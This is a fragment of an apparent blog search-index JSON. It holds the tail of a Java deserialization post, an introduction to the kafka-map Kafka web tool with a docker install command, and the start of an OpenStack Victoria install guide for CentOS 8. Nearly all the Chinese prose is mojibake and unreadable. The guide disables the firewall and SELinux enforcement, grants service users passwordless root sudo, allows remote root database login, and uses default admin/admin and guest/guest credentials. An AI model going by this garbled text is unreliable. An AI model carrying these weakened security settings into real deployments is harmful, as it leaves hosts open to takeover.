}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿è¡Œåè¾“å‡ºï¼š\u003c/p\u003e","title":"Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆä¸€ï¼‰Serializable"},{"content":"ä½¿ç”¨è¿‡kafkaçš„å°ä¼™ä¼´åº”è¯¥éƒ½çŸ¥é“kafkaæœ¬èº«æ˜¯æ²¡æœ‰ç®¡ç†ç•Œé¢çš„ï¼Œæ‰€æœ‰æ“ä½œéƒ½éœ€è¦æ‰‹åŠ¨æ‰§è¡Œå‘½ä»¤æ¥å®Œæˆã€‚ä½†æœ‰äº›å‘½ä»¤åˆå¤šåˆé•¿ï¼Œå¦‚æœæ²¡æœ‰åšç¬”è®°ï¼Œåˆ«è¯´æ˜¯æ–°æ‰‹ï¼Œå°±è¿è€æ‰‹ä¹Ÿä¸ä¸€å®šèƒ½è®°å¾—ä½ï¼Œæ¯æ¬¡æƒ³è¦ä½¿ç”¨çš„æ—¶å€™éƒ½è¦ä¸Šç½‘æœç´¢ä¸€ä¸‹ã€‚æœ‰äº›å´‡å°šgeekç²¾ç¥çš„äººæˆ–è®¸è§‰å¾—å‘½ä»¤è¡Œæ‰æ˜¯çœŸçˆ±ï¼Œä½†ä½¿ç”¨ä¸€æ¬¾å¥½ç”¨çš„å¯è§†åŒ–ç®¡ç†å·¥å…·çœŸçš„å¯ä»¥æå¤§çš„æå‡æ•ˆç‡ã€‚\nä»Šå¤©ç»™å¤§å®¶ä»‹ç»çš„è¿™æ¬¾å·¥å…·å«åškafka-mapï¼Œæ˜¯æˆ‘é’ˆå¯¹æ—¥å¸¸å·¥ä½œä¸­é«˜é¢‘ä½¿ç”¨çš„åœºæ™¯å¼€å‘çš„ï¼Œä½¿ç”¨äº†è¿™æ¬¾å·¥å…·ä¹‹åå°±ä¸å¿…è´¹å¿ƒè´¹åŠ›çš„å»æŸ¥èµ„æ–™æŸä¸ªå‘½ä»¤è¦æ€ä¹ˆå†™ï¼Œå°±åƒæ˜¯ï¼šâ€œç»™ç¼–ç¨‹æ’ä¸Šç¿…è†€ï¼Œç»™kafkaè£…ä¸Šå¯¼èˆªâ€ã€‚\nkafka-map ä»‹ç» kafka mapæ˜¯ä½¿ç”¨Java11å’ŒReactå¼€å‘çš„ä¸€æ¬¾kafkaå¯è§†åŒ–å·¥å…·ã€‚\nç›®å‰æ”¯æŒçš„åŠŸèƒ½æœ‰ï¼š\nå¤šé›†ç¾¤ç®¡ç† é›†ç¾¤çŠ¶æ€ç›‘æ§ï¼ˆåˆ†åŒºæ•°é‡ã€å‰¯æœ¬æ•°é‡ã€å­˜å‚¨å¤§å°ã€offsetï¼‰ ä¸»é¢˜åˆ›å»ºã€åˆ é™¤ã€æ‰©å®¹ï¼ˆåˆ é™¤éœ€é…ç½®delete.topic.enable = trueï¼‰ brokerçŠ¶æ€ç›‘æ§ æ¶ˆè´¹è€…ç»„æŸ¥çœ‹ã€åˆ é™¤ é‡ç½®offset æ¶ˆæ¯æŸ¥è¯¢ï¼ˆæ”¯æŒStringå’Œjsonæ–¹å¼å±•ç¤ºï¼‰ å‘é€æ¶ˆæ¯ï¼ˆæ”¯æŒå‘æŒ‡å®šçš„topicå’Œpartitionå‘é€å­—ç¬¦ä¸²æ¶ˆæ¯ï¼‰ åŠŸèƒ½æˆªå›¾ æ·»åŠ é›†ç¾¤ é›†ç¾¤ç®¡ç† broker ä¸»é¢˜ç®¡ç† æ¶ˆè´¹ç»„ æŸ¥çœ‹æ¶ˆè´¹ç»„å·²è®¢é˜…ä¸»é¢˜ topicè¯¦æƒ…â€”â€”åˆ†åŒº topicè¯¦æƒ…â€”â€”broker topicè¯¦æƒ…â€”â€”æ¶ˆè´¹ç»„ topicè¯¦æƒ…â€”â€”æ¶ˆè´¹ç»„é‡ç½®offset topicè¯¦æƒ…â€”â€”é…ç½®ä¿¡æ¯ ç”Ÿäº§æ¶ˆæ¯ æ¶ˆè´¹æ¶ˆæ¯ docker æ–¹å¼å®‰è£… ä¸€è¡Œå‘½ä»¤å³å¯å®Œæˆå®‰è£…\ndocker run -d \\ -p 8080:8080 \\ -v /opt/kafka-map/data:/usr/local/kafka-map/data \\ -e DEFAULT_USERNAME=admin -e DEFAULT_PASSWORD=admin --name kafka-map \\ --restart always dushixiang/kafka-map:latest æ›´å¤šå®‰è£…æ–¹å¼ä»¥åŠç›¸ä¿¡ä¿¡æ¯å¯æŸ¥çœ‹: https://github.com/dushixiang/kafka-map\næ¬¢è¿starå’Œåˆ†äº«ç»™å…¶ä»–å°ä¼™ä¼´ã€‚\n","permalink":"https://www.typesafe.cn/posts/share-a-kafka-web-manager/","summary":"\u003cp\u003eä½¿ç”¨è¿‡\u003ccode\u003ekafka\u003c/code\u003eçš„å°ä¼™ä¼´åº”è¯¥éƒ½çŸ¥é“\u003ccode\u003ekafka\u003c/code\u003eæœ¬èº«æ˜¯æ²¡æœ‰ç®¡ç†ç•Œé¢çš„ï¼Œæ‰€æœ‰æ“ä½œéƒ½éœ€è¦æ‰‹åŠ¨æ‰§è¡Œå‘½ä»¤æ¥å®Œæˆã€‚ä½†æœ‰äº›å‘½ä»¤åˆå¤šåˆé•¿ï¼Œå¦‚æœæ²¡æœ‰åšç¬”è®°ï¼Œåˆ«è¯´æ˜¯æ–°æ‰‹ï¼Œå°±è¿è€æ‰‹ä¹Ÿä¸ä¸€å®šèƒ½è®°å¾—ä½ï¼Œæ¯æ¬¡æƒ³è¦ä½¿ç”¨çš„æ—¶å€™éƒ½è¦ä¸Šç½‘æœç´¢ä¸€ä¸‹ã€‚æœ‰äº›å´‡å°šgeekç²¾ç¥çš„äººæˆ–è®¸è§‰å¾—å‘½ä»¤è¡Œæ‰æ˜¯çœŸçˆ±ï¼Œä½†ä½¿ç”¨ä¸€æ¬¾å¥½ç”¨çš„å¯è§†åŒ–ç®¡ç†å·¥å…·çœŸçš„å¯ä»¥æå¤§çš„æå‡æ•ˆç‡ã€‚\u003c/p\u003e\n\u003cp\u003eä»Šå¤©ç»™å¤§å®¶ä»‹ç»çš„è¿™æ¬¾å·¥å…·å«åš\u003ccode\u003ekafka-map\u003c/code\u003eï¼Œæ˜¯æˆ‘é’ˆå¯¹æ—¥å¸¸å·¥ä½œä¸­é«˜é¢‘ä½¿ç”¨çš„åœºæ™¯å¼€å‘çš„ï¼Œä½¿ç”¨äº†è¿™æ¬¾å·¥å…·ä¹‹åå°±ä¸å¿…è´¹å¿ƒè´¹åŠ›çš„å»æŸ¥èµ„æ–™æŸä¸ªå‘½ä»¤è¦æ€ä¹ˆå†™ï¼Œå°±åƒæ˜¯ï¼šâ€œç»™ç¼–ç¨‹æ’ä¸Šç¿…è†€ï¼Œç»™kafkaè£…ä¸Šå¯¼èˆªâ€ã€‚\u003c/p\u003e\n\u003ch2 id=\"kafka-map-ä»‹ç»\"\u003ekafka-map ä»‹ç»\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003ekafka map\u003c/code\u003eæ˜¯ä½¿ç”¨\u003ccode\u003eJava11\u003c/code\u003eå’Œ\u003ccode\u003eReact\u003c/code\u003eå¼€å‘çš„ä¸€æ¬¾\u003ccode\u003ekafka\u003c/code\u003eå¯è§†åŒ–å·¥å…·ã€‚\u003c/p\u003e\n\u003cp\u003eç›®å‰æ”¯æŒçš„åŠŸèƒ½æœ‰ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eå¤šé›†ç¾¤ç®¡ç†\u003c/li\u003e\n\u003cli\u003eé›†ç¾¤çŠ¶æ€ç›‘æ§ï¼ˆåˆ†åŒºæ•°é‡ã€å‰¯æœ¬æ•°é‡ã€å­˜å‚¨å¤§å°ã€offsetï¼‰\u003c/li\u003e\n\u003cli\u003eä¸»é¢˜åˆ›å»ºã€åˆ é™¤ã€æ‰©å®¹ï¼ˆåˆ é™¤éœ€é…ç½®delete.topic.enable = trueï¼‰\u003c/li\u003e\n\u003cli\u003ebrokerçŠ¶æ€ç›‘æ§\u003c/li\u003e\n\u003cli\u003eæ¶ˆè´¹è€…ç»„æŸ¥çœ‹ã€åˆ é™¤\u003c/li\u003e\n\u003cli\u003eé‡ç½®offset\u003c/li\u003e\n\u003cli\u003eæ¶ˆæ¯æŸ¥è¯¢ï¼ˆæ”¯æŒStringå’Œjsonæ–¹å¼å±•ç¤ºï¼‰\u003c/li\u003e\n\u003cli\u003eå‘é€æ¶ˆæ¯ï¼ˆæ”¯æŒå‘æŒ‡å®šçš„topicå’Œpartitionå‘é€å­—ç¬¦ä¸²æ¶ˆæ¯ï¼‰\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"åŠŸèƒ½æˆªå›¾\"\u003eåŠŸèƒ½æˆªå›¾\u003c/h2\u003e\n\u003ch3 id=\"æ·»åŠ é›†ç¾¤\"\u003eæ·»åŠ é›†ç¾¤\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"æ·»åŠ é›†ç¾¤\" loading=\"lazy\" src=\"https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/import-cluster.png\"\u003e\u003c/p\u003e\n\u003ch3 id=\"é›†ç¾¤ç®¡ç†\"\u003eé›†ç¾¤ç®¡ç†\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"é›†ç¾¤ç®¡ç†\" loading=\"lazy\" src=\"https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/clusters.png\"\u003e\u003c/p\u003e\n\u003ch3 id=\"broker\"\u003ebroker\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"broker\" loading=\"lazy\" src=\"https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/brokers.png\"\u003e\u003c/p\u003e\n\u003ch3 id=\"ä¸»é¢˜ç®¡ç†\"\u003eä¸»é¢˜ç®¡ç†\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"ä¸»é¢˜ç®¡ç†\" loading=\"lazy\" src=\"https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/topics.png\"\u003e\u003c/p\u003e\n\u003ch3 id=\"æ¶ˆè´¹ç»„\"\u003eæ¶ˆè´¹ç»„\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"æ¶ˆè´¹ç»„\" loading=\"lazy\" src=\"https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/consumers.png\"\u003e\u003c/p\u003e\n\u003ch3 id=\"æŸ¥çœ‹æ¶ˆè´¹ç»„å·²è®¢é˜…ä¸»é¢˜\"\u003eæŸ¥çœ‹æ¶ˆè´¹ç»„å·²è®¢é˜…ä¸»é¢˜\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"æ¶ˆè´¹ç»„è¯¦æƒ…\" loading=\"lazy\" src=\"https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/consumer-subscription.png\"\u003e\u003c/p\u003e\n\u003ch3 id=\"topicè¯¦æƒ…åˆ†åŒº\"\u003etopicè¯¦æƒ…â€”â€”åˆ†åŒº\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"topicè¯¦æƒ…â€”â€”åˆ†åŒº\" loading=\"lazy\" src=\"https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/topic-info-partition.png\"\u003e\u003c/p\u003e\n\u003ch3 id=\"topicè¯¦æƒ…broker\"\u003etopicè¯¦æƒ…â€”â€”broker\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"topicè¯¦æƒ…â€”â€”broker\" loading=\"lazy\" src=\"https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/topic-info-broker.png\"\u003e\u003c/p\u003e\n\u003ch3 id=\"topicè¯¦æƒ…æ¶ˆè´¹ç»„\"\u003etopicè¯¦æƒ…â€”â€”æ¶ˆè´¹ç»„\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"topicè¯¦æƒ…â€”â€”æ¶ˆè´¹ç»„\" loading=\"lazy\" src=\"https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/topic-info-consumer.png\"\u003e\u003c/p\u003e\n\u003ch3 id=\"topicè¯¦æƒ…æ¶ˆè´¹ç»„é‡ç½®offset\"\u003etopicè¯¦æƒ…â€”â€”æ¶ˆè´¹ç»„é‡ç½®offset\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"topicè¯¦æƒ…â€”â€”æ¶ˆè´¹ç»„é‡ç½®offset\" loading=\"lazy\" src=\"https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/topic-info-consumer-reset-offset.png\"\u003e\u003c/p\u003e\n\u003ch3 id=\"topicè¯¦æƒ…é…ç½®ä¿¡æ¯\"\u003etopicè¯¦æƒ…â€”â€”é…ç½®ä¿¡æ¯\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"topicè¯¦æƒ…â€”â€”é…ç½®ä¿¡æ¯\" loading=\"lazy\" src=\"https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/topic-info-config.png\"\u003e\u003c/p\u003e\n\u003ch3 id=\"ç”Ÿäº§æ¶ˆæ¯\"\u003eç”Ÿäº§æ¶ˆæ¯\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"æ¶ˆè´¹æ¶ˆæ¯\" loading=\"lazy\" src=\"https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/producer-message.png\"\u003e\u003c/p\u003e\n\u003ch3 id=\"æ¶ˆè´¹æ¶ˆæ¯\"\u003eæ¶ˆè´¹æ¶ˆæ¯\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"æ¶ˆè´¹æ¶ˆæ¯\" loading=\"lazy\" src=\"https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/consumer-message.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"docker-æ–¹å¼å®‰è£…\"\u003edocker æ–¹å¼å®‰è£…\u003c/h2\u003e\n\u003cp\u003eä¸€è¡Œå‘½ä»¤å³å¯å®Œæˆå®‰è£…\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker run -d \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    -p 8080:8080 \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    -v /opt/kafka-map/data:/usr/local/kafka-map/data \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    -e DEFAULT_USERNAME\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadmin\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    -e DEFAULT_PASSWORD\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadmin\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    --name kafka-map \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --restart always dushixiang/kafka-map:latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ›´å¤šå®‰è£…æ–¹å¼ä»¥åŠç›¸ä¿¡ä¿¡æ¯å¯æŸ¥çœ‹: \u003ca href=\"https://github.com/dushixiang/kafka-map\"\u003ehttps://github.com/dushixiang/kafka-map\u003c/a\u003e\u003c/p\u003e","title":"åˆ†äº«ä¸€æ¬¾éå¸¸å¥½ç”¨çš„kafkaå¯è§†åŒ–webç®¡ç†å·¥å…·"},{"content":"è¿‘æœŸå…¬å¸ä¸šåŠ¡éœ€æ±‚ï¼Œéœ€è¦å®‰è£…ä¸€å¥—Openstackç¯å¢ƒå­¦ä¹ ï¼Œçœ‹äº†ä¸€ä¸‹ç°åœ¨å·²ç»å‡ºäº†wallabyç‰ˆäº†ï¼Œæˆ‘æœæ–­é€‰æ‹©äº†ä¸Šä¸€ä¸ªç‰ˆæœ¬victoriaã€‚å› ä¸ºæ²¡æœ‰è¶³å¤Ÿå¤šçš„ç‰©ç†æœåŠ¡å™¨äº†ï¼Œåªå¥½æ‰¾äº†ä¸€å°64æ ¸256Gå†…å­˜6Tç¡¬ç›˜çš„æœºå™¨æ¥åˆ›å»ºå‡ å°è™šæ‹Ÿæœºæ¥æ­ç¯å¢ƒäº†ã€‚\nå®éªŒç¯å¢ƒ æ­¤æ¬¡å®éªŒä½¿ç”¨åˆ°äº†ä¸‰å°è™šæ‹Ÿæœºï¼Œéƒ½æ˜¯ä½¿ç”¨centos8ç³»ç»Ÿï¼Œä¸€å°æœºå™¨å½“ä½œæ§åˆ¶å’Œç½‘ç»œèŠ‚ç‚¹ï¼Œå¦å¤–ä¸¤å°å½“ä½œè®¡ç®—èŠ‚ç‚¹ï¼Œä½¿ç”¨OVS+VLANçš„ç½‘ç»œæ¨¡å¼ï¼Œeth0ä½œä¸ºç®¡ç†ç½‘ç»œï¼Œeth1äº’ç›¸è¿æ¥åˆ°OVSç½‘æ¡¥ä¸Šæ¨¡æ‹Ÿtrunkç½‘å¡ï¼Œcontrollerå¤šå¢åŠ ä¸€ä¸ªeth2ç”¨äºè®¿é—®å¤–éƒ¨ç½‘ç»œã€‚\nèŠ‚ç‚¹ ä½œç”¨ eth0 eth1 eth2 controller æ§åˆ¶èŠ‚ç‚¹ã€ç½‘ç»œèŠ‚ç‚¹ 172.16.10.100 æ— IP æ¡¥æ¥ï¼Œæ— IP compute-101 è®¡ç®—èŠ‚ç‚¹ 172.16.10.101 æ— IP âŒ compute-102 è®¡ç®—èŠ‚ç‚¹ 172.16.10.102 æ— IP âŒ å®‰è£…è™šæ‹Ÿæœº å®‰è£…ä¾èµ– å®‰è£…KVMå’ŒLinuxç½‘æ¡¥\nyum install -y qemu-kvm libvirt virt-install bridge-utils virt-manager dejavu-lgc-sans-fonts dejavu-lgc-sans-fontsç”¨äºè§£å†³ virt-manaer ä¹±ç \nå¯åŠ¨\nsystemctl enable libvirtd \u0026amp;\u0026amp; systemctl start libvirtd å®‰è£…OVS\nyum install openvswitch å¯åŠ¨OVS\nsystemctl enable openvswitch \u0026amp;\u0026amp; systemctl start openvswitch åˆ›å»ºè™šæ‹Ÿæœº ä½¿ç”¨ virt-manager åˆ›å»ºä¸‰å°è™šæ‹Ÿæœº\né…ç½®ç½‘ç»œ é…ç½®ç®¡ç†ç½‘å¡ ç»™è™šæ‹Ÿæœºé…ç½®æ¡¥æ¥ç½‘ç»œï¼Œå‚è€ƒLinuxè™šæ‹ŸåŒ–æŠ€æœ¯KVMï¼Œæ•ˆæœå¦‚å›¾\né…ç½®trunkç½‘å¡ ä½¿ç”¨ovsåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç½‘æ¡¥ã€‚\novs-vsctl add-br br-vlan æ­¤æ—¶ç½‘æ¡¥br-vlanä¸Šæ˜¯æ²¡æœ‰ä»»ä½•è™šæ‹Ÿç½‘å¡çš„ï¼Œç„¶åå…³é—­è™šæ‹Ÿæœºï¼Œåœ¨virt-managerä¸Šæ·»åŠ ä¸€ä¸ªç½‘ç»œè®¾å¤‡\nä½¿ç”¨å‘½ä»¤æ‰¾åˆ°è™šæ‹Ÿæœºå¹¶ç¼–è¾‘è™šæ‹ŸæœºXMLæ–‡ä»¶ã€‚\nvirsh list --all virsh edit controller æ‰¾åˆ°å¯¹åº”çš„ interface å…ƒç´ ï¼Œåœ¨ source å’Œ modelä¸­é—´æ·»åŠ ä¸€è¡Œã€‚\n\u0026lt;virtualport type=\u0026#39;openvswitch\u0026#39; /\u0026gt; ç„¶åä¿å­˜é€€å‡ºï¼Œå¯åŠ¨è™šæ‹Ÿæœºï¼Œå¯åŠ¨æˆåŠŸä¹‹åä¼š virtualport ä¸­é—´ç”Ÿæˆä¸€ä¸ªæ–°çš„å…ƒç´ ã€‚\nç¡®è®¤æ˜¯å¦æ·»åŠ æˆåŠŸã€‚\novs-vsctl show æˆåŠŸçš„è¯å¯ä»¥åœ¨ç½‘æ¡¥ä¸Šçœ‹åˆ°è‡ªåŠ¨ç”Ÿæˆçš„å‡ ä¸ªè™šæ‹Ÿç½‘å¡ã€‚\nBridge br-vlan Port br-vlan Interface br-vlan type: internal Port \u0026#34;vnet1\u0026#34; Interface \u0026#34;vnet1\u0026#34; Port \u0026#34;vnet2\u0026#34; Interface \u0026#34;vnet2\u0026#34; Port \u0026#34;vnet3\u0026#34; Interface \u0026#34;vnet3\u0026#34; ovs_version: \u0026#34;2.9.0\u0026#34; ä»¥ä¸Šæ­¥éª¤é‡å¤å‡ æ¬¡ä»¥å®Œæˆå…¶ä»–è™šæ‹Ÿæœºçš„é…ç½®ã€‚\nå®‰è£…Openstack é…ç½®ç¯å¢ƒ å…¨éƒ¨èŠ‚ç‚¹éƒ½éœ€è¦æ“ä½œã€‚\nåˆ‡æ¢ç½‘ç»œæœåŠ¡ä¸º network-scripts # å®‰è£…NetworkæœåŠ¡ yum install network-scripts -y # åœç”¨NetworkManagerå¹¶ç¦æ­¢å¼€æœºå¯åŠ¨ systemctl stop NetworkManager \u0026amp;\u0026amp; systemctl disable NetworkManager # å¯ç”¨Networkå¹¶è®¾ç½®å¼€æœºå¯åŠ¨ systemctl enable network \u0026amp;\u0026amp; systemctl start network è®¾ç½®é™æ€IP ç¼–è¾‘ç½‘å¡é…ç½®æ–‡ä»¶\nvim /etc/sysconfig/network-scripts/ifcfg-eth0 ä¿®æ”¹å¹¶æ·»åŠ ä»¥ä¸‹å†…å®¹\nBOOTPROTO=static ONBOOT=yes IPADDR=172.16.10.100 NETMASK=255.255.255.0 GATEWAY=172.16.0.1 é‡å¯ç½‘ç»œ\nsystemctl restart network ä¿®æ”¹ä¸»æœºåç§° # ä¿®æ”¹æ§åˆ¶èŠ‚ç‚¹ hostnamectl set-hostname controller # ä¿®æ”¹è®¡ç®—èŠ‚ç‚¹compute-101 hostnamectl set-hostname compute-101 # ä¿®æ”¹è®¡ç®—èŠ‚ç‚¹compute-102 hostnamectl set-hostname compute-102 ä¿®æ”¹hostsæ–‡ä»¶ æ·»åŠ ä»¥ä¸‹å†…å®¹\n172.16.10.100 controller 172.16.10.101 compute-101 172.16.10.102 compute-102 å…³é—­é˜²ç«å¢™ systemctl stop firewalld \u0026amp;\u0026amp; systemctl disable firewalld å®‰è£…åŸºç¡€æœåŠ¡ å…¨éƒ¨èŠ‚ç‚¹éƒ½éœ€è¦æ“ä½œã€‚\nå‡çº§è½¯ä»¶åŒ… yum upgrade -y å®‰è£…æ—¶é—´åŒæ­¥æœåŠ¡chronyd yum install chrony -y è®¡ç®—èŠ‚ç‚¹ä¿®æ”¹é…ç½®æ–‡ä»¶ /etc/chrony.conf ä¸­çš„ pool 2.centos.pool.ntp.org iburst ä¸º server controller iburst ç›´æ¥ä¸æ§åˆ¶èŠ‚ç‚¹åŒæ­¥æ—¶é—´ã€‚\né‡å¯chronyæœåŠ¡å¹¶å¼€æœºè‡ªå¯\nsystemctl restart chronyd \u0026amp;\u0026amp; systemctl enable chronyd å®‰è£…openstackå­˜å‚¨åº“ yum config-manager --enable powertools yum install centos-release-openstack-victoria -y å®‰è£…openstackå®¢æˆ·ç«¯å’Œopenstack-selinux yum install python3-openstackclient openstack-selinux -y ç¦ç”¨selinux cat\u0026gt;/etc/selinux/config\u0026lt;\u0026lt;EOF SELINUX=permissive SELINUXTYPE=targeted setenforce 0 EOF ä¿®æ”¹ç”¨æˆ·æƒé™ echo \u0026#34;neutron ALL = (root) NOPASSWD: ALL\u0026#34; \u0026gt; /etc/sudoers.d/neutron echo \u0026#34;nova ALL = (root) NOPASSWD: ALL\u0026#34; \u0026gt; /etc/sudoers.d/nova æ§åˆ¶èŠ‚ç‚¹ å®‰è£…æ•°æ®åº“ å®‰è£…Mariadbæ•°æ®åº“ï¼Œä¹Ÿå¯å®‰è£…MySQLæ•°æ®åº“ã€‚\nyum install mariadb mariadb-server python3-PyMySQL -y åˆ›å»ºå’Œç¼–è¾‘vim /etc/my.cnf.d/openstack.cnfæ–‡ä»¶ï¼Œæ·»åŠ å¦‚ä¸‹ä¿¡æ¯\n[mysqld] bind-address = 0.0.0.0 default-storage-engine = innodb innodb_file_per_table = on max_connections = 4096 collation-server = utf8_general_ci character-set-server = utf8 å¯åŠ¨æ•°æ®åº“å¹¶è®¾ç½®ä¸ºå¼€æœºè‡ªå¯\nsystemctl start mariadb \u0026amp;\u0026amp; systemctl enable mariadb é…ç½®æ•°æ®åº“\nmysql_secure_installation # è¾“å…¥å½“å‰ç”¨æˆ·rootå¯†ç ï¼Œè‹¥ä¸ºç©ºç›´æ¥å›è½¦ Enter current password for root (enter for none): OK, successfully used password, moving on... # æ˜¯å¦è®¾ç½®rootå¯†ç  Set root password? [Y/n] y # è¾“å…¥æ–°å¯†ç  New password: # å†æ¬¡è¾“å…¥æ–°å¯†ç  Re-enter new password: # æ˜¯å¦åˆ é™¤åŒ¿åç”¨æˆ· Remove anonymous users? [Y/n] y # æ˜¯å¦ç¦ç”¨è¿œç¨‹ç™»å½• Disallow root login remotely? [Y/n] n # æ˜¯å¦åˆ é™¤æµ‹è¯•æ•°æ®åº“ Remove test database and access to it? [Y/n] y # æ˜¯å¦é‡æ–°åŠ è½½æƒé™è¡¨ Reload privilege tables now? [Y/n] y # ä»¥ä¸Šæ­¥éª¤æ ¹æ®å®é™…æƒ…å†µåšé…ç½®å³å¯ï¼Œä¸ä¸€å®šè¦ä¸æ­¤å¤„ä¿æŒä¸€è‡´ å®‰è£…æ¶ˆæ¯é˜Ÿåˆ— å®‰è£…è½¯ä»¶åŒ…\nyum install rabbitmq-server -y å¯åŠ¨æ¶ˆæ¯é˜Ÿåˆ—æœåŠ¡å¹¶è®¾ç½®ä¸ºå¼€æœºè‡ªå¯\nsystemctl start rabbitmq-server \u0026amp;\u0026amp; systemctl enable rabbitmq-server æ·»åŠ openstackç”¨æˆ·å¹¶è®¾ç½®å¯†ç \nrabbitmqctl add_user openstack RABBIT_PASS ç»™openstackç”¨æˆ·å¯è¯»å¯å†™å¯é…ç½®æƒé™\nrabbitmqctl set_permissions openstack \u0026#34;.*\u0026#34; \u0026#34;.*\u0026#34; \u0026#34;.*\u0026#34; ä¸ºäº†æ–¹ä¾¿ç›‘æ§ï¼Œå¯ç”¨Webç•Œé¢ç®¡ç†æ’ä»¶\nrabbitmq-plugins enable rabbitmq_management æµè§ˆå™¨è®¿é—® IP:15672ï¼Œä½¿ç”¨ guest/guest ç™»å½•rabbitmq\nå®‰è£…Memcachedç¼“å­˜ å®‰è£…è½¯ä»¶åŒ…\nyum install memcached python3-memcached -y ç¼–è¾‘vim /etc/sysconfig/memcachedæ–‡ä»¶ï¼Œå°†OPTTONSè¡Œä¿®æ”¹æˆå¦‚ä¸‹ä¿¡æ¯\nOPTIONS=\u0026#34;-l 127.0.0.1,::1,controller\u0026#34; å¯åŠ¨MemcachedæœåŠ¡å¹¶è®¾ç½®å¼€æœºè‡ªå¯\nsystemctl start memcached \u0026amp;\u0026amp; systemctl enable memcached å®‰è£…KeyStoneæœåŠ¡ åˆ›å»ºæ•°æ®åº“ è¿æ¥æ•°æ®åº“\nmysql -u root -p åˆ›å»ºkeystoneæ•°æ®åº“\nCREATE DATABASE keystone; æˆäºˆkeystoneæ•°æ®åº“æƒé™ï¼Œç„¶åé€€å‡º\nGRANT ALL PRIVILEGES ON keystone.* TO \u0026#39;keystone\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;KEYSTONE_DBPASS\u0026#39;; GRANT ALL PRIVILEGES ON keystone.* TO \u0026#39;keystone\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;KEYSTONE_DBPASS\u0026#39;; exit; å®‰è£…è½¯ä»¶åŒ… å®‰è£…è½¯ä»¶\nyum install openstack-keystone httpd python3-mod_wsgi -y ä¿®æ”¹é…ç½®æ–‡ä»¶\ncat \u0026gt; /etc/keystone/keystone.conf \u0026lt;\u0026lt;EOF [DEFAULT] [database] connection = mysql+pymysql://keystone:KEYSTONE_DBPASS@controller/keystone [token] provider = fernet EOF åˆå§‹åŒ–æ•°æ®åº“\nsu -s /bin/sh -c \u0026#34;keystone-manage db_sync\u0026#34; keystone åˆå§‹åŒ–Fernet\nkeystone-manage fernet_setup --keystone-user keystone --keystone-group keystone keystone-manage credential_setup --keystone-user keystone --keystone-group keystone å¼•å¯¼èº«ä»½è®¤è¯æœåŠ¡\nkeystone-manage bootstrap --bootstrap-password ADMIN_PASS \\ --bootstrap-admin-url http://controller:5000/v3/ \\ --bootstrap-internal-url http://controller:5000/v3/ \\ --bootstrap-public-url http://controller:5000/v3/ \\ --bootstrap-region-id RegionOne é…ç½®Apache HTTPæœåŠ¡ ä¿®æ”¹vim /etc/httpd/conf/httpd.confæ–‡ä»¶ï¼Œæ·»åŠ 